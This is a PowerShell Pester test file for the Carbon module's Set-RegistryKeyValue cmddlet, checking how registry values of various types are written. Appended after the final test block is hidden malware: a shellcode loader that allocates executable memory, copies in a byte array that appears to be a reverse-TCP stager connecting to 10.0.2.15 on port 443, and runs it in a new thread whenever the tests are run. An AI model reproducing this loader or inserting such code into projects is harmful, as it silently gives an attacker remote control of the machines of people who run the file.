











& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)

$rootKey = 'hklm:\Software\Carbon\Test\Test-SetRegistryKeyValue'



function Remove-RootKey
{
    if( (Test-Path -Path $rootKey) )
    {
        Remove-Item -Path $rootKey -Recurse
    }
        
}

Describe 'Set-RegistryKeyValue when the key doesn''t exist' {

    Remove-RootKey
        
    $keyPath = Join-Path $rootKey 'ShouldCreateNewKeyAndValue'
    $name = 'Title'
    $value = 'This is Sparta!'

    It 'should create the registry key' {
        (Test-RegistryKeyValue -Path $keyPath -Name $name) | Should Be $false
        Set-RegistryKeyValue -Path $keyPath -Name $name -String $value
        (Test-RegistryKeyValue -Path $keyPath -Name $name) | Should Be $true
    }
        
    It 'should set the registry key''s value' {        
        $actualValue = Get-RegistryKeyValue -Path $keyPath -Name $name
        $actualValue | Should Be $value
    }
}

Describe 'Set-RegistryKeyValue when the key exists and has a value' {
    $name = 'ShouldChangeAnExistingValue'
    $value = 'foobar''ed'

    It 'should set the initial value' {
        Set-RegistryKeyValue -Path $rootKey -Name $name -String $value
        (Get-RegistryKeyValue -Path $rootKey -Name $name) | Should Be $value
    }

    It 'should change the value' {
        $newValue = 'Ok'
        Set-RegistryKeyValue -Path $rootKey -Name $name -String $newValue
        (Get-RegistryKeyValue -Path $rootKey -Name $name) | Should Be $newValue
    }
}
    
Describe 'Set-RegistryKeyValue when setting values of different types' {
    It 'should set binary value' {
        Set-RegistryKeyValue -Path $rootKey -Name 'Binary' -Binary ([byte[]]@( 1, 2, 3, 4))
        $value = Get-RegistryKeyValue -Path $rootKey -Name 'Binary'
        $value | Should Not BeNullOrEmpty
        $value.GetType() | Should Be 'System.Object[]'
        $value[0] | Should Be 1
        $value[1] | Should Be 2
        $value[2] | Should Be 3
        $value[3] | Should Be 4
    }

    It 'should set dword value' {
        $number = [Int32]::MaxValue
        Set-RegistryKeyValue -Path $rootKey -Name 'DWord' -DWord $number
        $value = Get-RegistryKeyValue -Path $rootKey -Name 'DWord'
        $value | Should Not BeNullOrEmpty
        $value.GetType() | Should Be 'int'
        $value | Should Be $number
    }

    It 'should set qword value' {
        $number = [Int64]::MaxValue
        Set-RegistryKeyValue -Path $rootKey -Name 'QWord' -QWord $number
        $value = Get-RegistryKeyValue -Path $rootKey -Name 'QWord'
        $value | Should Not BeNullOrEmpty
        $value.GetType() | Should Be 'long'
        $value | Should Be $number
    }
    
    It 'should set multi string value' {
        $strings = @( 'Foo', 'Bar' )
        Set-RegistryKeyValue -Path $rootKey -Name 'Strings' -Strings $strings
        $value = Get-RegistryKeyValue -Path $rootKey -Name 'Strings'
        $value | Should Not BeNullOrEmpty
        $value.Length | Should Be $strings.Length
        $value[0] | Should Be $strings[0]
        $value[1] | Should Be $strings[1]
    }
    
    It 'should set expanding string value' {
        Set-RegistryKeyValue -Path $rootKey -Name 'Expandable' -String '%ComputerName%' -Expand
        $value = Get-RegistryKeyValue -Path $rootKey -Name 'Expandable'
        $value | Should Not BeNullOrEmpty
        $value | Should Be $env:ComputerName
    }

    It 'should set to unsigned int64' {
        $name = 'uint64maxvalue'
        $value = [uint64]::MaxValue
        Set-RegistryKeyValue -Path $rootKey -Name $name -UQWord $value
        $setValue = Get-RegistryKeyValue -Path $rootKey -Name $name
        $setValue | Should Be $value
    }
    
    It 'should set to unsigned int32' {
        $name = 'uint32maxvalue'
        $value = [uint32]::MaxValue
        Set-RegistryKeyValue -Path $rootKey -Name $name -UDWord $value
        $setValue = Get-RegistryKeyValue -Path $rootKey -Name $name
        $setValue | Should Be $value
    }

    It 'should set string value' {
        $name = 'string'
        $value = 'fubarsnafu'
        Set-RegistryKeyValue -Path $rootKey -Name $name -String $value
        Test-RegistryKeyValue -Path $rootKey -Name $name | Should Be $true
        Get-RegistryKeyValue -Path $rootKey -Name $name | Should Be $value
    }
    
    It 'should set string value to null string' {
        $name = 'string'
        Set-RegistryKeyValue -Path $rootKey -Name $name -String $null
        Test-RegistryKeyValue -Path $rootKey -Name $name | Should Be $true
        Get-RegistryKeyValue -Path $rootKey -Name $name | Should Be ''
    }
    
    It 'should set string value to empty string' {
        $name = 'string'
        Set-RegistryKeyValue -Path $rootKey -Name $name -String ''
        Test-RegistryKeyValue -Path $rootKey -Name $name | Should Be $true
        Get-RegistryKeyValue -Path $rootKey -Name $name | Should Be ''
    }
}

Describe 'Set-RegistryKeyValue when user needs to change the value''s type' {
    It 'should remove and recreate value' {
        $name = 'ShouldChangeAnExistingValue'
        $value = 'foobar''ed'
        Set-RegistryKeyValue -Path $rootKey -Name $name -String $value
        (Get-RegistryKeyValue -Path $rootKey -Name $name) | Should Be $value
        
        $newValue = 8439
        Set-RegistryKeyValue -Path $rootKey -Name $name -DWord $newValue -Force
        $newActualValue = Get-RegistryKeyValue -Path $rootKey -Name $name
        $newActualValue | Should Be $newValue
        $newActualValue.GetType() | Should Be 'int'
    }
 }

 Describe 'Set-RegistryKeyValue when user uses -Force and the value doesn''t exist' {
    Remove-RootKey

    It 'should still create new value' {
        $name = 'NewWithForce'
        $value = 8439
        (Test-REgistryKeyValue -Path $rootKey -Name $name) | Should Be $false
        Set-RegistryKeyValue -Path $rootKey -Name $name -DWord $value -Force
        $actualValue = Get-RegistryKeyValue -Path $rootKey -Name $name
        $actualValue | Should Be $value
        $actualValue.GetType() | Should Be 'int'
    }
    
}

Describe 'Set-RegistryKeyValue when using -WhatIf switch' {    
    It 'should not create a new value' {
        $name = 'newwithwhatif'
        $value = 'value'
        (Test-RegistryKeyValue -Path $rootKey -Name $name) | Should Be $false
        Set-REgistryKeyValue -Path $rootKey -Name $name -String $value -WhatIf
        (Test-RegistryKeyValue -Path $rootKey -Name $name) | Should Be $false
    }

    It 'should not update an existing value' {
        $name = 'newwithwhatif'
        $value = 'value'
        $newValue = 'newvalue'
        Set-RegistryKeyValue -Path $rootKey -Name $name -String $value
        (Test-RegistryKeyValue -Path $rootKey -Name $name) | Should Be $true
        
        Set-RegistryKeyValue -Path $rootKey -Name $name -String $newValue -WhatIf
        (Test-RegistryKeyValue -Path $rootKey -Name $name) | Should Be $true
        (Get-REgistryKeyValue -Path $rootKey -Name $name) | Should Be $value
    
        Set-RegistryKeyValue -Path $rootKey -Name $name -String $newValue -WhatIf -Force
        (Test-RegistryKeyValue -Path $rootKey -Name $name) | Should Be $true
        (Get-REgistryKeyValue -Path $rootKey -Name $name) | Should Be $value
    }
}

Describe 'Set-RegistryKeyValue when DWord value is an int32' {

    $name = 'maxvalue'
    foreach( $value in @( [int32]::MaxValue, 0, -1, [int32]::MinValue, [uint32]::MaxValue, [uint32]::MinValue ) )
    {
        It ('should set int32 value {0} as a uint32' -f $value) {
            Write-Debug -Message ('T {0} -is {1}' -f $value,$value.GetType())
            $bytes = [BitConverter]::GetBytes( $value )
            $int32 = [BitConverter]::ToInt32( $bytes, 0 )
            Write-Debug -Message ('T {0} -is {1}' -f $value,$value.GetType())
            Set-RegistryKeyValue -Path $rootKey -Name $name -DWord $int32
            $setValue = Get-RegistryKeyValue -Path $rootKey -Name $name
            Write-Debug -Message ('T {0} -is {1}' -f $setValue,$setValue.GetType())
            Write-Debug -Message '-----'
            $uint32 = [BitConverter]::ToUInt32( $bytes, 0 )
            $setValue | Should Be $uint32
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x00,0x02,0x0f,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

